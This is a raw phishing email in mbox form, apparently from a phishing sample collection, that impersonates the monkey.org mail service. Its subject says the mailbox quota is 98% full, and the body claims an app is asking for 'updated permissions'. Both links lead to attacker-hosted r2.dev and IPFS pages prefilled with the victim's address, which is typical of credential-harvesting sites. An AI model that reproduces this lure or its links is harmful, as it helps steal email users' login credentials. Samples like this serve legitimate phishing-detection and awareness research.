@@ -1,0 +1,129 @@
+From jose@monkey.org Sat Nov  4 11:47:37 2023 +0000
+Return-Path: contact@narumi.co.jp
+Delivered-To: jose@monkey.org
+X-FDA: 81420096954.02.5C68659
+Received: from mta0.narumi.co.jp (unknown [188.93.233.34])
+	by imf30.b.hostedemail.com (Postfix) with ESMTP id 26B20180006
+	for <jose@monkey.org>; Sat,  4 Nov 2023 11:47:35 +0000 (UTC)
+Authentication-Results: imf30.b.hostedemail.com;
+	dkim=none ("invalid DKIM record") header.d=narumi.co.jp header.s=default header.b=I7zpRAxl;
+	spf=softfail (imf30.b.hostedemail.com: 188.93.233.34 is neither permitted nor denied by domain of contact@narumi.co.jp) smtp.mailfrom=contact@narumi.co.jp;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1699098456;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=mFL0tUHz3R4N8Gv/ZuCYEX9enw8M6K/QinClBSKvg4Y=;
+	b=5gyZP0l+9D6m1OaS+faiNzz8OGSRxzFJRvMXA8ukT+gAFutVk1392913z1bLC5jCqxRfq5
+	EqmmCXOsTUb/B50QsQ/GF/NCEtWrh+KNasI3gkhcyLSipX8CREucASpQy6ag61rJx3oZa+
+	vCCOiJ7RI8ePnb2oEnMSVgTs+DX8tnw=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1699098456; a=rsa-sha256;
+	cv=none;
+	b=DKAXDrxi+Xpv7A95KPIdH7LlHgta8YP8rSAwis+uvGu2RhtvC3+R1AtGKy1Nr5rvdjUTSc
+	uxuLKsyUoNxy9RhjrA/w0V7er490iNZVMy48Rifm01RmCQJ+Ohm7XC/YCd5Y2QcUFOMep1
+	NgN5W5arJ9xLV3UnYALpgj1qrsWnkPg=
+ARC-Authentication-Results: i=1;
+	imf30.b.hostedemail.com;
+	dkim=none ("invalid DKIM record") header.d=narumi.co.jp header.s=default header.b=I7zpRAxl;
+	spf=softfail (imf30.b.hostedemail.com: 188.93.233.34 is neither permitted nor denied by domain of contact@narumi.co.jp) smtp.mailfrom=contact@narumi.co.jp;
+	dmarc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=narumi.co.jp;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=contact@narumi.co.jp;
+ bh=mFL0tUHz3R4N8Gv/ZuCYEX9enw8M6K/QinClBSKvg4Y=;
+ b=I7zpRAxl9MRMq366eWqAMcbKqgZ68d6XJXXJROBRT+7m6fjC8cErvj1aEe8EEznvsx/H9nDhlObv
+   5v9PdV2MyGIPd5xHh6uyRJTNk0hfYvfnmN+X/P1Hn0ykT8d8jOwvOsBG4x56XcIIx7dfTJOV1M+Y
+   +xjuVmYUNH7SRIcJJhY=
+From: monkey.org<contact@narumi.co.jp>
+To: jose@monkey.org
+Subject: Mail Box Quota:98% Full
+Date: 04 Nov 2023 11:47:34 -0700
+Message-ID: <20231104114734.8759A64D3CD504F7@narumi.co.jp>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 26B20180006
+X-Stat-Signature: ax9ssmj9dzadjpbgn4ft8k1sby1xctti
+X-Spam-Status: Yes, score=13.30
+X-Rspam-User: 
+X-HE-Tag: 1699098455-848425
+X-HE-Meta: U2FsdGVkX1/zlYF1QWMGsEffACH8a+tQYEncOZt8GNE6sx2wBRW3XHScFrZLMFiuPxqtV7VgBanKCY2LqUogkQnImTJ3Mc1HihejdKwuYPEoRTi/OuQHLOQ24aVe1RmrD0gGn8UTSGmaAXrSxvk8bvTv+ZVWVJqV3X5aftMreL8DfZL6A7CMAOeyAowdIe8DXF1rq3PGOOK3/4Dv1cF3mJ9sWALYCuI1BNQOV8O4JEY=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 355
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19963"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<DIV style=3D'FONT-SIZE: 16px; FONT-FAMILY: "YS Text", Arial, sans-serif; W=
+IDTH: 550px; COLOR: rgb(26,26,26); PADDING-TOP: 20px; MARGIN: 0px auto; BAC=
+KGROUND-COLOR: rgb(250,250,250)'>
+<H1 style=3D'FONT-SIZE: 40px; FONT-FAMILY: "helvetica neue", helvetica, ari=
+al, sans-serif; FONT-WEIGHT: normal; COLOR: rgb(51,51,51); MARGIN: 0px'>Upd=
+ated Permissions Request</H1>
+<P style=3D'FONT-SIZE: 17px; FONT-FAMILY: "helvetica neue", helvetica, aria=
+l, sans-serif; COLOR: rgb(85,85,85); MARGIN: 0px 0px 30px'>The monkey.org i=
+s requesting additional access to your account.</P></DIV>
+<DIV style=3D'FONT-SIZE: 16px; BORDER-TOP: rgb(221,221,221) 1px solid; FONT=
+-FAMILY: "YS Text", Arial, sans-serif; BORDER-RIGHT: rgb(221,221,221) 1px s=
+olid; WIDTH: 510px; BACKGROUND-IMAGE: none; BACKGROUND-REPEAT: repeat; BORD=
+ER-BOTTOM: rgb(221,221,221) 1px solid; BACKGROUND-POSITION: 0% 0%; COLOR: r=
+gb(26,26,26); PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 20px; =
+MARGIN: 20px auto; BORDER-LEFT: rgb(221,221,221) 1px solid; PADDING-RIGHT: =
+20px; background-size: auto; background-origin:=20
+padding-box; background-clip: border-box; border-radius: 3px'>
+<P style=3D'FONT-SIZE: 14px; FONT-FAMILY: "helvetica neue", helvetica, aria=
+l, sans-serif; COLOR: rgb(51,51,51); MARGIN: 5px 0px 15px; LINE-HEIGHT: 20p=
+x'>Hello there!</P>
+<P style=3D'FONT-SIZE: 14px; FONT-FAMILY: "helvetica neue", helvetica, aria=
+l, sans-serif; COLOR: rgb(51,51,51); MARGIN: 5px 0px 15px; LINE-HEIGHT: 20p=
+x'>You&#8217;re receiving this email because the monkey.org , which is curr=
+ently installed on your&nbsp;<STRONG>jose@monkey.org</STRONG>&nbsp;account,=
+ has updated its permissions and is requesting additional access.</P>
+<P style=3D'FONT-SIZE: 18px; FONT-FAMILY: "helvetica neue", helvetica, aria=
+l, sans-serif; COLOR: rgb(51,51,51); MARGIN: 5px 0px 15px; LINE-HEIGHT: 20p=
+x'>
+<A style=3D"COLOR: rgb(65,131,196); text-decoration-line: none" href=3D"htt=
+ps://pub-f852b2fc6f914584a80cb8d69ee1417a.r2.dev/pagefem345.html#jose@monke=
+y.org" rel=3D"noopener noreferrer" target=3D_blank data-saferedirecturl=3D"=
+https://www.google.com/url?q=3Dhttps://ipfs.io/ipfs/QmesTCduMGbEeNU8wvqZLZS=
+xENvS4YkiFv382gRismook3?filename%3Dindex.htm%23%5B%5B-Email-%5D%5D&amp;sour=
+ce=3Dgmail&amp;ust=3D1698994549871000&amp;usg=3DAOvVaw3YZY9Ki5JZ7MhrqUn_MwU=
+8">Review permission request to accept or reject this change</A></P>
+<P style=3D'FONT-SIZE: 14px; FONT-FAMILY: "helvetica neue", helvetica, aria=
+l, sans-serif; COLOR: rgb(51,51,51); MARGIN: 5px 0px 15px; LINE-HEIGHT: 20p=
+x'>You may choose to ignore this request, in which case monkey.org will ret=
+ain its current permissions.</P>
+<P style=3D'FONT-SIZE: 14px; FONT-FAMILY: "helvetica neue", helvetica, aria=
+l, sans-serif; COLOR: rgb(51,51,51); MARGIN: 5px 0px 15px; LINE-HEIGHT: 20p=
+x'>
+You can view pending requests directly by visiting your account&#8217;s set=
+tings page and clicking on Applications. If you run into problems, please&n=
+bsp;<A style=3D"COLOR: rgb(65,131,196); text-decoration-line: none" href=3D=
+"https://pub-f852b2fc6f914584a80cb8d69ee1417a.r2.dev/pagefem345.html#jose@m=
+onkey.org" rel=3D"noopener noreferrer" target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://ipfs.io/ipfs=
+/QmesTCduMGbEeNU8wvqZLZSxENvS4YkiFv382gRismook3?filename%3Dindex.htm%23%5B%=
+5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1698994549872000&amp;usg=3DAOv=
+Vaw2KMGefgmVeeMc3e7d3JZJz">contact support.</A></P>
+<P style=3D'FONT-SIZE: 14px; FONT-FAMILY: "helvetica neue", helvetica, aria=
+l, sans-serif; COLOR: rgb(51,51,51); MARGIN: 15px 0px 5px; LINE-HEIGHT: 20p=
+x'>Thanks!<BR><BR></P></DIV>
+<DIV style=3D'FONT-SIZE: 16px; FONT-FAMILY: "YS Text", Arial, sans-serif; C=
+OLOR: rgb(26,26,26); TEXT-ALIGN: center; MARGIN: 20px 0px; BACKGROUND-COLOR=
+: rgb(250,250,250)'>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "YS Text", Arial, sans-serif; WH=
+ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
+0; COLOR: rgb(26,26,26); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2=
+; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-thickness: initial; text-decoration-style: initial; text-decora=
+tion-color: initial'></DIV></BODY></HTML>
